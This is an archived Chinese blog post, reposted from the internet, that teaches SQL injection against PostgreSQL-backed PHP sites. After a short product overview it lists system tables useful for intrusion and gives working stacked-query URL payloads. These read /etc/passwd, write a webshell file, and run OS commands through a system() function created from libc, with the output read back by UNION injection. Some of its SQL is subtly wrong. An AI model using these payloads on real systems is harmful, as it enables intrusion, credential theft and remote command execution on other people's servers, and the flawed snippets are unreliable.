<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=gbk">
<title>PostgreSQL research</title>
<style type="text/css">
.blogcnt{line-height:160%;font-size:14px;text-align:left;word-wrap:break-word;}
.blogcnt *{line-height:160%;}
.blogcnt p{margin:0 0 10px;}
.blogcnt ul,.nbw-blog ol{margin:5px 0 5px 40px;padding:0}
.blogcnt em{font-style:italic;}
.blogcnt blockquote{font-size:1em;margin:auto 0 auto 35px;}
.blogcnt img{border:0;max-width:100%;}
</style>
</head>
<body style="color:#444444;">
<h1 id="blog-Title"><a href="index.html">PostgreSQL research</a></h1>
<div id="" style="padding:0 20px;">
	<h2 id="">【转载】关于SQL注入,PHP例</h2>
	<h5 id="">2011-11-17 12:58:42&nbsp;&nbsp;&nbsp;<a href="http://blog.163.com/digoal@126/blog/static/1638770402011101705842393/" target="_blank">查看原文&gt;&gt;</a></h5>
	<div class="" id="" style="padding:0 20px;">
		<div class="blogcnt" style="width:800px;"><div>转自互联网, 都是PHP的例子.&nbsp;</div><div><br></div><div>PostgreSQL是一个强大开源的关系数据库系统.它经过了15年多的开发历程,一个经得起考验的体系结构,在可靠性、数据完整性和正确性方面赢得了极好的声誉.它运行在所有主要的操作系统上,包括Linux、UNIX (AIX, BSD, HP-UX, SGI IRIX, Mac OS X, Solaris, Tru64)和Windows. 它是完全符合ACID原则，完全支持外键、联合、视图、触发器和存储过程(多种语言)。</div><div>&nbsp;</div><div>它包含了SQL92和SQL99的大部分数据类型，包括INTEGER,NUMERIC,BOOLEAN,CHAR,VARCHAR,DATE,INTERVAL和TIMESTAMP.它也支持存储二进制巨型对象,包括图片、声音和视频.它有本地编程接口，C/C++、Java、.Net、Perl、Python、Ruby、Tcl、ODBC，其中还有特别的文档.PostgreSQL以执行标准为傲。</div><div>&nbsp;</div><div>它强有力地实现了ANSI-SQL 92/99标准.它充分支持子查询(包括FROM子句的子选择) 、提交读(read-committed)、序列化事务隔离级别.虽然PostgreSQL有一个完全关系系统编目(catalog)它自己支持每数据库多重纲要(schema),它的编目也可以通过SQL标准定义的纲要信息(Information Schema)来存取.数据完整性功能包括(复合)主键、限制和级联更新/删除的外键、CHECK约束、UNIQUE约束和非空约束.它也有许多扩展和高级功能.其中有为了方便按顺序自动增加列值,LIMIT/OFFSET允许返回部分结果集.PostgreSQL支持符合、惟一、局部和函数索引,可以使用B-tree,R-tree,hash,或者GiST存储方法中的任一个。</div><div>&nbsp;</div><div>安装</div><div>&nbsp;</div><div>1.windows下:在官网(http://www.postgresql.org)下载windows下安装包,目前最新版本是8.3的,这里需要注意下,安装PostgreSQL时会在系统用户中添加一个postgres用户,而且在windows下的Postgresql密码自带有类似于安全策略的东西,设置密码是需要复杂度和长度的限制.安装好后,需要配置系统环境变量,把../PostgreSQL/bin添加到系统环境变量,这样的话,可以直接在cmd中执行psql(类似于mysql在windows下的mysql.exe)。</div><div>&nbsp;</div><div>2.*nix下安装:可以到官网下载相应的安装包或者在线安装,安装过程不会出现设置密码这个步骤,默认密码是空,使用psql的时候需要切换postgres用户登录就可以了。</div><div>&nbsp;</div><div>基本语法</div><div>&nbsp;</div><div>既然是数据库当然遵循SQL语言,create、insert、update等被称为PL/PgSQL,但不是很明确,一个数据库的语法太多了,只说下对小黑们有用的几个语法。</div><div>&nbsp;</div><div>1.注释、结束标记、连接符</div><div>a.PostgreSQL既然遵循SQL语言,当然支持--注释;</div><div>b.PostgreSQL支持/*和/**/注释,这点类似于Mysql;</div><div>c.PostgreSQL数据库使用psql的时候,需要在命令后加上;(分号)或者是\g来表示语句已经结束以执行查询.</div><div>d.PostgreSQL是采用||符号来连接字符串的,注意使用^,小心|被转义。</div><div>&nbsp;</div><div>2.自动匹配</div><div>PostgreSQL不像Mysql能够自动匹配字段,这点类似于oracle,所以在注入的时候要注意下,而且默认情况下是支持union查询的;</div><div>&nbsp;</div><div>3.连接PostgreSQL</div><div>&nbsp;</div><div>默认情况下是不给外连的,如果想远程管理PostgreSQL数据库的话,需要修改../PostgreSQL/data/pg_bha.conf文件,请参考 &nbsp; &nbsp; &nbsp; &nbsp;PostgreSQL学习手册.PostgreSQL默认用户是postgres(类似于mysql的root),默认端口是5432,默认系统库是postgres。</div><div>&nbsp;</div><div>使用psql -h ip -d dataname -p port -U username,这里注意-U参数是大写,如果是本机采用默认安装的话,直接使用psql -U &nbsp; &nbsp; postgres后会提示输入密码,正确输入密码后会出现postgres=#的字符(类似于mysql中的mysql&gt;),就可以正常使用psql了。</div><div>&nbsp;</div><div>\? 显示pgsql命令的说明</div><div>\h 显示sql命令的说明</div><div>\q 是退出</div><div>\l 是现实系统中所有的数据库</div><div>&nbsp;</div><div>4.pgAdmin III和phpPgAdmin</div><div>a.pgAdmin III是PostgreSQL中自带的界面化数据库管理程序,可以查询PostgreSQL数据库中所有域、函数、序列、数据表结构及相关属性、触发器函数、视图等。</div><div>&nbsp;</div><div>b.phpPgAdmin看名字就知道类似mysql的phpMyAdmin,是使用php开发的网页版数据库管理程序,功能非常强大,使用过phpMyAdmin的朋友 &nbsp; 都知道phpMyAdmin的强大,phpPgAdmin针对PostgreSQL数据库一样强大。</div><div>&nbsp;</div><div>注入PostgreSQL</div><div>&nbsp;</div><div>既然PostgreSQL是RDBMS,所以系统中所有数据库的结构会保存系统库中,所以注入的时候就相对比较方便。由于注释方式和mysql是一样,如何判断是什么数据库?关于这点我也没有一个标准的答案,我想可以扫描5432端口(如何web和库没有分离的情况下),使用version()函数的返回结果来判断,直接使用查询语句如select * from pg_class/select * from pg_group的返回结果来判断数据库类型.由于PostgreSQL的目录页存在information_schema,我手上也没有PostgreSQL数据库的注射点,所以我也不知道能不能使用select schema_name from information_schema_schemata来判断,不好意思,关于使用information_schema只是我的想法,有条件的朋友验证下。</div><div>&nbsp;</div><div>介绍下PostgreSQL中内置函数、表和视图在入侵的应用。</div><div>current_database() &nbsp; &nbsp;当前数据库名字 &nbsp; &nbsp;</div><div>session_user &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;会话用户 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |</div><div>current_user &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;目前执行环境中的用户名 &nbsp; |这三个函数调用时候不需要加()</div><div>user &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;和session_user一样 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|</div><div>inet_client_port() &nbsp; &nbsp;远程端口</div><div>cast(sourcetype AS targettype) &nbsp; 定义类型转换 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</div><div>current_setting() &nbsp; &nbsp; 以查询形式获取setting_name 设置的当前值</div><div>convert() &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 编码转换</div><div>pg_stat_user_tables &nbsp; 存放系统所有表名的视图,关键字段是relname,使用select relname from pg_stat_user_tables limit offset,1 来达到逐个读取表名的目的</div><div>pg_stat_all_tables &nbsp; &nbsp;和pg_stat_all_tables视图功能一样</div><div>pg_shadow &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 看到shadow大家是否想到/etc/shadow,此表包含数据库用户的信息,关键字段username、passwd和usesuper(超级用户的意思),不过此表被做了权限设置</div><div>pg_user &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 这个表结构和pg_shadow一样,不过此表的全局可读,passwd字段可能被清空或者加密</div><div>pg_group &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;定义组以及哪些用户属于哪个组的信息,关键字段groname</div><div>information_schema.columns 这个目录对象中保存了所有的字段,关键字段是column_name,使用select column_name from &nbsp; information_columns where table_name=tablename limit offset,1这样就可以达到读取每个表名的字段</div><div>&nbsp;</div><div>读文件</div><div>&nbsp;</div><div>首先需要建立一个表,然后copy文件内容到表中,在读取表内容,思路是这样的</div><div>create table read (line text);</div><div>copy read from '/etc/passwd';alter table read add id serial--</div><div>select * from read;</div><div>drop read;</div><div>思路就是这样的,具体怎么使用就看大家自己发挥了(encode,^_^)</div><div>&nbsp;</div><div>从PostgreSQL 8.2后加入了pg_file_read(text,text,bool)和pg_file_write(text,text,bool),看名字就应该知道是干什么用的吧,大家自己去挖掘吧!</div><div>&lt;?php</div><div>&nbsp;</div><div>if(empty($_GET['action']))</div><div>{</div><div>&nbsp;</div><div>?&gt;</div><div>&lt;form action="?action=connect" method=POST&gt;</div><div>&lt;table&gt;</div><div>&lt;tr&gt;&lt;td&gt;pghost:&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="pghost" size="30" value="127.0.0.1"&gt;&lt;/td&gt;&lt;/tr&gt;</div><div>&lt;tr&gt;&lt;td&gt;pgport:&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="pgport" size="30" value="5432" &gt;&lt;/td&gt;&lt;/tr&gt;</div><div>&lt;tr&gt;&lt;td&gt;dbname:&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="pgdbname" size="30" value="postgres"&gt;&lt;/td&gt;&lt;/tr&gt;</div><div>&lt;tr&gt;&lt;td&gt;username:&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="pgusername" size="30" value="postgres"&gt;&lt;/td&gt;&lt;/tr&gt;</div><div>&lt;tr&gt;&lt;td&gt;password:&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="pgpassword" size="30" value=""&gt;&lt;/td&gt;&lt;/tr&gt;</div><div>&lt;tr&gt;&lt;td&gt; &lt;/td&gt;&lt;td&gt;&lt;input type="submit" name="submit" value="connect"&gt; &nbsp; &lt;input type="reset" name="reset" value="reset"&gt;&lt;/td&gt;&lt;/tr&gt;</div><div>&lt;/form&gt;</div><div>&lt;p&gt;</div><div>&lt;?php</div><div>exit;</div><div>}</div><div>&nbsp;</div><div>if(!empty($_GET['action']))//连接postgresql</div><div>{</div><div>if(!empty($_POST['pghost']))</div><div>$_SESSION['pghost']=$_POST['pghost'];</div><div>if(!empty($_POST['pgport']))</div><div>$_SESSION['pgport']=$_POST['pgport'];</div><div>if(!empty($_POST['pgdbname']))</div><div>$_SESSION['pgdbname']=$_POST['pgdbname'];</div><div>if(!empty($_POST['pgusername']))</div><div>$_SESSION['pgusername']=$_POST['pgusername'];</div><div>if(!empty($_POST['pgpassword']))</div><div>$_SESSION['pgpassword']=$_POST['pgpassword'];</div><div>$dbconn_string = "host= port= dbname= user= password="; &nbsp; &nbsp; &nbsp;</div><div>$dbconn=pg_connect($dbconn_string);</div><div>&nbsp;</div><div>if(!$dbconn)</div><div>{</div><div>die('failed linking to the server,please check &lt;a href="javascript:history.back()"&gt;reset&lt;/a&gt;' );</div><div>}</div><div>else</div><div>echo '^_^ connected successfully and the status is '.pg_connection_status($dbconn).'&lt;br&gt;&lt;br&gt;'; &nbsp;&nbsp;</div><div>}</div><div>&nbsp;</div><div>&nbsp;</div><div>如何获得webshell</div><div>http://127.0.0.1/postgresql.php?id=1;create%20table%20fuck(shit%20text%20not%20null);</div><div>&nbsp;</div><div>http://127.0.0.1/postgresql.php?id=1;insert into fuck values($$$$);</div><div>&nbsp;</div><div>&nbsp;</div><div>http://127.0.0.1/postgresql.php?id=1;copy%20fuck(shit)%20to%20$$/tmp/test.php$$;</div><div>&nbsp;</div><div>如何读文件</div><div>http://127.0.0.1/postgresql.php?id=1;create table myfile (input TEXT); &nbsp;</div><div>http://127.0.0.1/postgresql.php?id=1;copy myfile from ‘/etc/passwd’; &nbsp;</div><div>http://127.0.0.1/postgresql.php?id=1;select * from myfile;</div><div>&nbsp;</div><div>执行命令有两种方式，一种是需要自定义的lic函数支持，一种是用pl/python支持的。</div><div>当然，这些的postgresql的数据库版本必须大于8.X。</div><div>&nbsp;</div><div>创建一个system的函数：</div><div>CREATE FUNCTION system(cstring) RETURNS int AS ’/lib/libc.so.6’, ’system’ LANGUAGE ’C’ STRICT</div><div>&nbsp;</div><div>创建一个输出表：</div><div>CREATE TABLE stdout(id serial, system_out text)</div><div>&nbsp;</div><div>执行shell，输出到输出表内：</div><div>SELECT system(’uname -a &gt; /tmp/test’)</div><div>&nbsp;</div><div>copy 输出的内容到表里面；</div><div>COPY stdout(system_out) FROM ’/tmp/test’</div><div>&nbsp;</div><div>从输出表内读取执行后的回显，判断是否执行成功</div><div>&nbsp;</div><div>SELECT system_out FROM stdout</div><div>&nbsp;</div><div>下面是测试例子</div><div>&nbsp;</div><div>/store.php?id=1; CREATE TABLE stdout(id serial, system_out text) -- /store.php?id=1; CREATE FUNCTION system(cstring) RETURNS int AS</div><div>’/lib/libc.so.6’,’system’ LANGUAGE ’C’STRICT --/store.php?id=1; SELECT system(’uname -a &gt; /tmp/test’) --/store.php?id=1; COPY stdout(system_out) FROM ’/tmp/test’ --/store.php?id=1 UNION ALL SELECT NULL,(SELECT stdout FROM system_out</div><div>ORDER BY id DESC),NULL LIMIT 1 OFFSET 1--</div><wbr></div>
	</div>
</div>
</body>
</html>